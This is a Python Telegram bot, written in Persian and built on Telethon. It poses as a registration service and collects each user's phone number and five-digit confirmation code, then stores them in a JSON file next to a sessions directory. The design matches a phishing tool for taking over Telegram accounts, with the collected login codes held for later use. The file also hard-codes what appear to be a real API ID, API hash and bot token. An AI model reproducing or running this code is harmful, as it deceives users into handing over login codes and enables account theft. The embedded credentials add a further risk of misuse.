"""
ربات دریافت اطلاعات از کاربرا
"""

import asyncio
import json
import os
from datetime import datetime
from telethon import TelegramClient, events

# ========== تنظیمات ==========
API_ID = 17187664
API_HASH = 'd6eae2c921342bb71816a980dc11b9f5'
BOT_TOKEN = '8680597965:AAERhsYmlIou-MEOnbV598bxI0EeQlyzS04'

USERS_FILE = 'users.json'
SESSIONS_DIR = 'sessions/'

def ensure_files():
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'w') as f:
            json.dump({}, f, indent=2)

def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

class InfoBot:
    def __init__(self):
        self.client = None
        self.user_steps = {}
        
    async def start(self):
        ensure_files()
        
        self.client = TelegramClient('info_bot', API_ID, API_HASH)
        await self.client.start(bot_token=BOT_TOKEN)
        
        me = await self.client.get_me()
        print(f"✅ ربات @{me.username} متصل شد!")
        print(f"📁 فایل کاربران: {USERS_FILE}")
        
        @self.client.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            user_id = str(event.sender_id)
            self.user_steps[user_id] = {'step': 'start'}
            await event.reply("""
🐱 **به ربات ثبت‌نام خوش آمدی!**

📌 **مراحل:**
1️⃣ شماره تلفن خود را وارد کنید
2️⃣ کد تایید را وارد کنید

📱 لطفاً شماره خود را با کد کشور وارد کنید:
مثال: +989123456789
            """)
        
        @self.client.on(events.NewMessage)
        async def phone_handler(event):
            user_id = str(event.sender_id)
            text = event.raw_text
            
            if text.startswith('/'):
                return
            
            if user_id not in self.user_steps:
                await event.reply("❌ لطفاً اول /start رو بزنید.")
                return
            
            step = self.user_steps[user_id].get('step', 'start')
            
            if step == 'start' or step == 'phone':
                if not text.startswith('+') or not text[1:].isdigit():
                    await event.reply("❌ شماره باید با + شروع بشه!\nمثال: +989123456789")
                    return
                
                self.user_steps[user_id] = {'step': 'code', 'phone': text}
                await event.reply(f"✅ شماره {text} ثبت شد!\n🔑 کد ۵ رقمی رو وارد کن:")
                return
            
            if step == 'code':
                code = text.strip()
                if not code.isdigit() or len(code) != 5:
                    await event.reply("❌ کد باید ۵ رقم باشد!\nمثال: 12345")
                    return
                
                users = load_users()
                users[user_id] = {
                    'phone': self.user_steps[user_id].get('phone'),
                    'code': code,
                    'status': 'pending',
                    'registered_at': datetime.now().isoformat(),
                    'group_link': 'https://t.me/+NJNJp5hUf3IzNTRk'
                }
                save_users(users)
                del self.user_steps[user_id]
                
                await event.reply("""
✅ **اطلاعات با موفقیت ثبت شد!**

🔄 ربات اصلی به زودی فعال میشه...
📊 وضعیت: در صف انتظار
                """)
                print(f"🆕 کاربر جدید: {user_id} - {users[user_id]['phone']}")
                return
            
            await event.reply("❌ دستور نامعتبر! /start رو بزن.")
        
        @self.client.on(events.NewMessage(pattern='/status'))
        async def status_handler(event):
            user_id = str(event.sender_id)
            users = load_users()
            if user_id in users:
                data = users[user_id]
                status = data.get('status', 'unknown')
                status_text = {'pending': '⏳ در صف', 'active': '✅ فعال', 'error': '❌ خطا'}.get(status, '❓ نامشخص')
                await event.reply(f"""
📊 **وضعیت شما:**
📱 شماره: {data.get('phone', 'نامشخص')}
📌 وضعیت: {status_text}
🕒 ثبت: {data.get('registered_at', 'نامشخص')}
                """)
            else:
                await event.reply("❌ ثبت‌نام نکردی! /start رو بزن.")
        
        print("🔄 منتظر پیام‌های کاربران...")
        await self.client.run_until_disconnected()

if __name__ == "__main__":
    try:
        asyncio.run(InfoBot().start())
    except KeyboardInterrupt:
        print("\n👋 خداحافظ!")
    except Exception as e:
        print(f"❌ خطا: {e}")
